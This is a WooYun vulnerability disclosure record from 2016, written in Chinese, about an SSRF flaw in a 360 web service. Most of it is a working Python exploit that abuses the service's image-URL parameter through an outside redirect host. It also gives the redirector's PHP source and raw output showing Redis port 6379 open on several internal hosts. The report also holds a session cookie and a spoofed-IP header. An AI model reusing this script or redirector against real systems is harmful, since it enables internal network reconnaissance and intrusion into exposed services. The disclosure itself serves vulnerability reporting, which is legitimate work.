{"id": 88695, "wybug_id": "wooyun-2016-0229611", "wybug_title": "360某处ssrf漏洞可探测内网信息(附内网6379探测脚本)                                      ", "wybug_corp": "奇虎360", "wybug_author": "Sunshie", "wybug_date": "2016-07-15 15:38", "wybug_open_date": "2016-07-15 16:15", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-07-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-07-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  漏洞地址：http://st.so.com\n\n利用302绕过http协议限制\n#!/usr/bin/env python# -*- coding: utf-8 -*-# @Author: Lcy# @Date:   2016-07-05 20:55:30# @Last Modified by:   Lcyimport requestsimport threadingimport Queueimport randomimport timeurl = \"http://st.so.com/stu\"threads_count = 3que = Queue.Queue()lock = threading.Lock()threads = []ip = \"10.121.3.\"def getIp():    return str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))headers = {    \"Cache-Control\":\"max-age=0\",    \"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",    \"User-Agent\":\"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36\",    \"Cookie\": \"__guid=6491553.4279294988408965000.1467944097350.527; PHPSESSID=d88gvotjet30c0cp28iuv1s771; count=45\",    \"Content-Type\":\"application/x-www-form-urlencoded\",    \"X-Forwarded-For\":getIp(),}for i in range(1,255):    que.put(ip + str(i))def run():    while que.qsize() > 0:        ip = que.get()        try:            payload = \"http://tv.phpinfo.me/exp.php?s=ftp%26ip={ip}%26port={port}%26data=helo.jpg\".format(                ip=ip,                port=\"65321\")            param = {\"imgurl\":payload}            r = requests.post(url,data=param,headers = headers,timeout=2.2)            try:                payload = \"http://tv.phpinfo.me/exp.php?s=ftp%26ip={ip}%26port={port}%26data=helo.jpg\".format(                ip=ip,                port=\"6379\")                param = {\"imgurl\":payload}                r = requests.post(url,data=param,headers=headers,timeout=2.2)                lock.acquire()                print ip                lock.release()            except :                lock.acquire()                print \"{ip}  6379 Open\".format(ip=ip)                lock.release()        except:            passfor i in range(threads_count):    t = threading.Thread(target=run)    threads.append(t)    t.setDaemon(True)    t.start()while que.qsize() > 0:    time.sleep(1.0)\nexp.php源码：\n<?php$ip = $_GET['ip'];$port = $_GET['port'];$scheme = $_GET['s'];$data = $_GET['data'];header(\"Location: $scheme://$ip:$port/$data\");?>\n\n\n\n10.121.3.110.121.3.210.121.3.310.121.3.410.121.3.510.121.3.610.121.3.9  6379 Open10.121.3.1110.121.3.1410.121.3.1310.121.3.1510.121.3.1810.121.3.16  6379 Open10.121.3.2110.121.3.2010.121.3.2410.121.3.23  6379 Open10.121.3.25  6379 Open10.121.3.2810.121.3.2910.121.3.32  6379 Open10.121.3.3410.121.3.3510.121.3.3610.121.3.3710.121.3.3810.121.3.3910.121.3.4110.121.3.4210.121.3.40  6379 Open10.121.3.43  6379 Open10.121.3.45  6379 Open10.121.3.4710.121.3.4910.121.3.5110.121.3.48  6379 Open10.121.3.5310.121.3.5510.121.3.5410.121.3.5610.121.3.5710.121.3.5810.121.3.5910.121.3.6110.121.3.6010.121.3.6210.121.3.6310.121.3.6410.121.3.6510.121.3.6610.121.3.6710.121.3.6810.121.3.6910.121.3.7010.121.3.7110.121.3.7210.121.3.7310.121.3.7410.121.3.7510.121.3.7610.121.3.7710.121.3.7910.121.3.7810.121.3.8010.121.3.8210.121.3.8110.121.3.8310.121.3.8410.121.3.8510.121.3.8610.121.3.8710.121.3.8810.121.3.8910.121.3.9010.121.3.9110.121.3.9210.121.3.9310.121.3.9410.121.3.9510.121.3.9610.121.3.9710.121.3.9810.121.3.9910.121.3.10010.121.3.10110.121.3.10210.121.3.10310.121.3.10410.121.3.10510.121.3.10610.121.3.10710.121.3.10810.121.3.10910.121.3.11010.121.3.11110.121.3.11210.121.3.11310.121.3.11410.121.3.11510.121.3.11610.121.3.11710.121.3.11810.121.3.11910.121.3.12010.121.3.12110.121.3.12210.121.3.12310.121.3.12410.121.3.12510.121.3.12610.121.3.12710.121.3.12810.121.3.12910.121.3.13010.121.3.13110.121.3.13210.121.3.13310.121.3.13410.121.3.13510.121.3.13610.121.3.13710.121.3.13810.121.3.13910.121.3.14010.121.3.14110.121.3.14210.121.3.14310.121.3.14410.121.3.14510.121.3.14610.121.3.14710.121.3.14810.121.3.14910.121.3.15010.121.3.15110.121.3.15210.121.3.15310.121.3.15410.121.3.15510.121.3.15610.121.3.15710.121.3.15810.121.3.15910.121.3.16010.121.3.16110.121.3.16210.121.3.16310.121.3.16410.121.3.16510.121.3.16610.121.3.16710.121.3.16810.121.3.17010.121.3.16910.121.3.17110.121.3.17210.121.3.17310.121.3.17410.121.3.17510.121.3.17610.121.3.17710.121.3.17810.121.3.17910.121.3.18010.121.3.18110.121.3.18210.121.3.18310.121.3.18410.121.3.18510.121.3.18610.121.3.18710.121.3.18810.121.3.18910.121.3.19010.121.3.19110.121.3.19210.121.3.19310.121.3.19410.121.3.19510.121.3.19610.121.3.19710.121.3.19810.121.3.19910.121.3.20010.121.3.20110.121.3.20210.121.3.20310.121.3.20410.121.3.20510.121.3.20610.121.3.20710.121.3.20810.121.3.20910.121.3.21010.121.3.21110.121.3.21210.121.3.21310.121.3.21410.121.3.21510.121.3.21610.121.3.21710.121.3.21810.121.3.21910.121.3.22010.121.3.22110.121.3.22310.121.3.22210.121.3.22410.121.3.22510.121.3.22610.121.3.22710.121.3.22810.121.3.22910.121.3.23010.121.3.23110.121.3.23210.121.3.23310.121.3.23410.121.3.23510.121.3.23610.121.3.23710.121.3.23810.121.3.23910.121.3.24010.121.3.24110.121.3.24210.121.3.24310.121.3.24410.121.3.24510.121.3.24610.121.3.24710.121.3.24810.121.3.24910.121.3.25010.121.3.25110.121.3.25210.121.3.25310.121.3.254\n就不深入利用了   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 Sunshie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-07-15 16:15 厂商回复： 感谢您关注360产品安全，该漏洞属于误报问题。有疑问请360SRC官方渠道联系，有专人跟进。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-07-15 15:47 |    \t\t小骨 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 歡笑中，幾多淒愴歲月裏苦挨。風雨中，幾多...)\t\t \n  前排    \n     2016-07-15 15:48 |    \t\tzhiher \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:4        )\t\t \n  前排    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}